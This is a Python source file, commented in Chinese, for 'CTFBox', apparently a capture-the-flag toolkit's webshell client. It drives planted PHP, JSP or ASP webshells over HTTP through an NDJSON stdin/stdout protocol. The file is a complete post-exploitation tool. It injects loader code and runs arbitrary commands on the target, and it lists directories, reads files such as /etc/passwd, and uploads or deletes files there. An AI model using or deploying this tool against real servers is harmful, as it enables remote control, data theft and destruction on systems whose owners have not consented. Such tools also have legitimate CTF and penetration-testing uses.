#!/usr/bin/env python3
"""CTFBox 第一方 Webshell 管理引擎。

通过 stdin/stdout 的 NDJSON 协议驱动（每行一个 JSON 对象）：

请求（op）:
  {"op":"connect","target":"http://h/s.php","password":"pass","payloadType":"php","encoder":"base64"}
  {"op":"exec","cmd":"id"}
  {"op":"ls","path":"/var/www"}
  {"op":"read","path":"/etc/passwd"}
  {"op":"upload","path":"/tmp/a","content":"<base64>"}
  {"op":"delete","path":"/tmp/a"}
  {"op":"disconnect"}

事件（ev）:
  {"ev":"connected","info":{...}}
  {"ev":"exec","cmd":..,"output":..}
  {"ev":"listing","path":..,"entries":[{"name","type","size"}]}
  {"ev":"file","path":..,"encoding":"base64","content":..}
  {"ev":"progress","stage":..,"path":..,"done":true}
  {"ev":"error","message":..,"op":..}

设计约定：引擎向目标注入一段语言相关的 loader 代码（password 参数），
真实的动作参数以 JSON 放在 ARG_PARAM 参数里（raw 或 base64 传输）；
shell 侧解码后执行，并将 `{"ok":bool,...}` 结果包裹在 MARKER 之间回显。
引擎解析 MARKER 内的 JSON。仅连接用户显式指定的目标，不落盘、不扫描。
"""

from __future__ import annotations

import base64
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ARG_PARAM = "ctfbox_args"
MARKER_START = "<<<CTFBOX>>>"
MARKER_END = "<<</CTFBOX>>>"
TIMEOUT = 15
SUPPORTED_PAYLOADS = ("php", "jsp", "asp", "aspx")
SUPPORTED_ENCODERS = ("raw", "base64")


# ---------------------------------------------------------------------------
# loader 载荷：真实场景下由 shell 侧解释执行；测试用假端点会模拟其契约。
# ---------------------------------------------------------------------------

def loader_code(payload_type: str, arg_param: str) -> str:
    """返回语言相关的 loader 代码，读取 arg_param 参数并回显 MARKER 包裹的结果。"""
    if payload_type == "php":
        return (
            f"$a=$_POST['{arg_param}'];"
            f"echo '{MARKER_START}';echo ctfbox_dispatch($a);echo '{MARKER_END}';"
        )
    if payload_type in ("asp", "aspx"):
        return (
            f"var a=Request.Form(\"{arg_param}\");"
            f"Response.Write(\"{MARKER_START}\"+ctfbox_dispatch(a)+\"{MARKER_END}\");"
        )
    if payload_type == "jsp":
        return (
            f"String a=request.getParameter(\"{arg_param}\");"
            f"out.print(\"{MARKER_START}\"+ctfboxDispatch(a)+\"{MARKER_END}\");"
        )
    raise ValueError(f"不支持的载荷类型：{payload_type}")


def encode_args(args: dict, encoder: str) -> str:
    """把动作参数编码进传输字段。"""
    payload = json.dumps(args, ensure_ascii=False)
    if encoder == "base64":
        return base64.b64encode(payload.encode("utf-8")).decode("ascii")
    return payload


# ---------------------------------------------------------------------------
# 会话
# ---------------------------------------------------------------------------

class Session:
    def __init__(self) -> None:
        self.target: str | None = None
        self.password: str = ""
        self.payload_type: str = "php"
        self.encoder: str = "raw"

    @property
    def connected(self) -> bool:
        return self.target is not None

    def request(self, args: dict) -> dict:
        """向目标发送一次动作请求，返回解析后的结果字典。"""
        if self.target is None:
            raise RuntimeError("尚未连接")
        body = urllib.parse.urlencode(
            {
                self.password: loader_code(self.payload_type, ARG_PARAM),
                ARG_PARAM: encode_args(args, self.encoder),
            }
        ).encode("utf-8")
        req = urllib.request.Request(
            self.target,
            data=body,
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:  # noqa: S310 用户指定目标
            raw = resp.read().decode("utf-8", errors="replace")
        return self._parse(raw)

    @staticmethod
    def _parse(raw: str) -> dict:
        start = raw.find(MARKER_START)
        end = raw.find(MARKER_END, start + 1)
        if start == -1 or end == -1:
            raise RuntimeError("响应中未找到有效标记，可能不是有效的 shell")
        inner = raw[start + len(MARKER_START):end].strip()
        try:
            result = json.loads(inner)
        except json.JSONDecodeError as error:
            raise RuntimeError(f"结果解析失败：{error}") from error
        if not isinstance(result, dict) or not result.get("ok", False):
            message = result.get("error", "shell 执行失败") if isinstance(result, dict) else "无效结果"
            raise RuntimeError(str(message))
        return result.get("data", {})


# ---------------------------------------------------------------------------
# NDJSON 事件输出
# ---------------------------------------------------------------------------

def emit(event: dict) -> None:
    sys.stdout.write(json.dumps(event, ensure_ascii=False))
    sys.stdout.write("\n")
    sys.stdout.flush()


# ---------------------------------------------------------------------------
# 操作分发
# ---------------------------------------------------------------------------

def op_connect(session: Session, message: dict) -> None:
    target = message.get("target")
    if not isinstance(target, str) or not target:
        raise ValueError("缺少目标地址")
    payload_type = message.get("payloadType", "php")
    encoder = message.get("encoder", "raw")
    if payload_type not in SUPPORTED_PAYLOADS:
        raise ValueError(f"不支持的载荷类型：{payload_type}")
    if encoder not in SUPPORTED_ENCODERS:
        raise ValueError(f"不支持的编码器：{encoder}")
    session.target = target
    session.password = str(message.get("password", "pass"))
    session.payload_type = payload_type
    session.encoder = encoder
    try:
        info = session.request({"action": "sysinfo"})
    except Exception:
        session.target = None
        raise
    emit({"ev": "connected", "info": info})


def op_exec(session: Session, message: dict) -> None:
    cmd = message.get("cmd")
    if not isinstance(cmd, str) or not cmd:
        raise ValueError("缺少命令")
    data = session.request({"action": "exec", "cmd": cmd})
    emit({"ev": "exec", "cmd": cmd, "output": data.get("output", "")})


def op_ls(session: Session, message: dict) -> None:
    path = str(message.get("path", "."))
    data = session.request({"action": "list", "path": path})
    emit({"ev": "listing", "path": path, "entries": data.get("entries", [])})


def op_read(session: Session, message: dict) -> None:
    path = message.get("path")
    if not isinstance(path, str) or not path:
        raise ValueError("缺少文件路径")
    data = session.request({"action": "read", "path": path})
    emit(
        {
            "ev": "file",
            "path": path,
            "encoding": "base64",
            "content": data.get("content", ""),
        }
    )


def op_upload(session: Session, message: dict) -> None:
    path = message.get("path")
    content = message.get("content")
    if not isinstance(path, str) or not path:
        raise ValueError("缺少目标路径")
    if not isinstance(content, str):
        raise ValueError("缺少文件内容")
    data = session.request({"action": "write", "path": path, "content": content})
    emit(
        {
            "ev": "progress",
            "stage": "upload",
            "path": path,
            "written": data.get("written", 0),
            "done": True,
        }
    )


def op_delete(session: Session, message: dict) -> None:
    path = message.get("path")
    if not isinstance(path, str) or not path:
        raise ValueError("缺少目标路径")
    session.request({"action": "delete", "path": path})
    emit({"ev": "progress", "stage": "delete", "path": path, "done": True})


OPERATIONS = {
    "connect": op_connect,
    "exec": op_exec,
    "ls": op_ls,
    "read": op_read,
    "upload": op_upload,
    "delete": op_delete,
}


def dispatch(session: Session, message: dict) -> bool:
    """执行一条操作，返回 False 表示应结束循环。"""
    op = message.get("op")
    if op == "disconnect":
        session.target = None
        emit({"ev": "progress", "stage": "disconnect", "done": True})
        return False
    handler = OPERATIONS.get(op)
    if handler is None:
        emit({"ev": "error", "op": op, "message": f"未知操作：{op}"})
        return True
    if op != "connect" and not session.connected:
        emit({"ev": "error", "op": op, "message": "尚未连接目标"})
        return True
    try:
        handler(session, message)
    except (urllib.error.URLError, OSError) as error:
        emit({"ev": "error", "op": op, "message": f"网络错误：{error}"})
    except Exception as error:  # noqa: BLE001 引擎需保持不崩溃
        emit({"ev": "error", "op": op, "message": str(error)})
    return True


def main() -> int:
    session = Session()
    for raw_line in sys.stdin:
        line = raw_line.strip()
        if not line:
            continue
        try:
            message = json.loads(line)
        except json.JSONDecodeError as error:
            emit({"ev": "error", "op": None, "message": f"无效 JSON：{error}"})
            continue
        if not isinstance(message, dict):
            emit({"ev": "error", "op": None, "message": "请求必须是 JSON 对象"})
            continue
        if not dispatch(session, message):
            break
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
